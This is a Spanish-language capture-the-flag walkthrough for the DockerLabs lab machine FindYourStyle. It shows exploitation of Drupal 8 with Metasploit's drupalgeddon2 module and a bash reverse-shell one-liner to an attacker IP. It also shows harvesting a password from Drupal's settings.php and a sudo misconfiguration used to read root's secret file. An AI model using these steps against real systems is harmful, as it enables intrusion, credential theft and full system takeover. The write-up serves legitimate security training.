# Maquina FindYourStyle - DockerLabs.es

![alt text](ImagenesFindYourStyle/image.png)

Verificar que la maquina este desplegada correctamente

![alt text](ImagenesFindYourStyle/image-1.png)

Realizamos un ping a la máquina para verificar la comunicación y confirmamos que la conexión es exitosa.

![alt text](ImagenesFindYourStyle/image-2.png)

A continuación, realizamos un escaneo de la IP utilizando Nmap.

![alt text](ImagenesFindYourStyle/image-3.png)

Observamos que el puerto 80 está abierto. Ahora realizamos un escaneo adicional para detectar, enumerar servicios y versiones.

![alt text](ImagenesFindYourStyle/image-4.png)

En este caso vemos que el puerto 80 que ejecuta un Apache y esta la web está montada con Drupal 8. Accederemos a la página web alojada en esta máquina utilizando un navegador y veremos lo siguiente.

![alt text](ImagenesFindYourStyle/image-5.png)

Si hacemos una busqueda utilizando `Metasploit` encontraremos varios exploit, en mi caso yo utilicé el `exploit/unix/webapp/drupal_drupalgeddon2` el cual me dio resultados.

![alt text](ImagenesFindYourStyle/image-6.png)

Primero configuramos el exploit con las configuraciones requeridas. Para ver lo que necesitamos configurar escribimos `show options`

![alt text](ImagenesFindYourStyle/image-7.png)

En este caso necesitaremos modificar el RHOST solamente y lo haremos con `set RHOST <<ip-victima>>`

Y para validar que se moficó podemos volver a utilizar `show options`

![alt text](ImagenesFindYourStyle/image-8.png)

Ya una vez configurado ejecutamos el comando `run` y esperamos que nos envie una sesión meterpreter...

Y vemos que ya estamos dentro.

![alt text](ImagenesFindYourStyle/image-9.png)

Ahora para trabajar de forma mas comoda me pasaré a shell y luego me enviaré una y me pondre a la escuchat con Netcat de la siguiente manera.

Nos ponemos a la escucha por el puerto 4545

![alt text](ImagenesFindYourStyle/image-10.png)

Y en la sesión meterpreter escribiremos `shell` que nos permitira intruducir una shell de comandos del sistema y luego de eso nos proporcionamos una `bash` y por ultimo nos enviamos una reverse shell de la siguiente forma `/bin/bash -i >& /dev/tcp/172.16.1.131/4545 0>&1`

![alt text](ImagenesFindYourStyle/image-11.png)

## Tratamiento de la TTY

**Para trabajar de manera mas cómoda haremos lo siguiente:**
Una vez estemos dentro ejecutamos el siguiente comando: `script /dev/null -c bash`

Luego presionamos: `Ctrl + Z` para suspender el proceso

A continuación, escribimos: `stty raw -echo; fg`

Despues ingresamos: `reset`

Cuando se nos pregunte: "Terminal type?" Ingresamos `xterm`.

Finalmente, exportamos las siguientes variables de entorno: `export TERM=xterm` `export SHELL=bash`

Y listo!

## Escalada de Privilegios

Si vemos la lista de usuarios notaremos que hay uno llamado `ballenita`

![alt text](ImagenesFindYourStyle/image-12.png)

Si hacemos una busqueda del archivo `settings.php` el cual es un archivo en Drupal de configuracion que contiene ajustes esenciales para el funcionamiento del sitio web y en el cual podemos encontrar credenciales, notaremos que el archivo esta en la ruta `/var/www/html/sites/default/settings.php`

![alt text](ImagenesFindYourStyle/image-13.png)

Si leemos el contenido de dicho archivo y filtramos por la palabra `password` utilizando un `grep` veremos que contiene una posible contraseña la cual es `ballenitafeliz`

![alt text](ImagenesFindYourStyle/image-14.png)

Si intentamos ingresar con el usuario `ballenita` que vimos en el `/etc/passwd` y porporcionamos la contraseña `ballenitafeliz` lograremos movernos a dicho usuario.

![alt text](ImagenesFindYourStyle/image-15.png)

Si ejecutamos el comando `sudo -l` estando con el usuario `ballenita` veremos que podemos ejecutar los binarios `/bin/ls` y `/bin/grep` como el usuario `root` sin proporcionar contraseña.

![alt text](ImagenesFindYourStyle/image-16.png)

Ahora si hacemos un `sudo /bin/ls -la /root/` veremos que hay un archivo de texto llamado `secretitomaximo.txt`

![alt text](ImagenesFindYourStyle/image-17.png)

Ahora intentaremos leer ese archivo con `sudo /bin/grep '' /root/secretitomaximo.txt` para ver su contenido y obtendremos la siguiente cadena de texto `nobodycanfindthispasswordrootrocks`.

![alt text](ImagenesFindYourStyle/image-18.png)

Si intentamos usar esta cadena texto como contraseña para acceder como `root` veremos que tenemos exito y seremos root.

![alt text](ImagenesFindYourStyle/image-19.png)
